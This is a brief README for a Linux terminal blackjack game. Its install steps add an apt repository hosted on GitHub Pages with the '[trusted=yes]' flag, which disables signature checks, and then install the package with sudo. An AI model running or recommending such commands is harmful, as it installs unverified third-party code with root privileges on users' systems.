# 🃏 High Stakes Blackjack

A Blackjack game that runs directly in the Linux terminal.

## 🚀 Install

On a fresh Ubuntu/Debian-based Linux system, copy and paste these commands:
### Not the "```bash" bit tho
```bash
echo "deb [trusted=yes arch=all] https://altonklojzy028-ops.github.io/highstakes stable main" | sudo tee /etc/apt/sources.list.d/highstakes.list
sudo apt update
sudo apt install -y highstakes
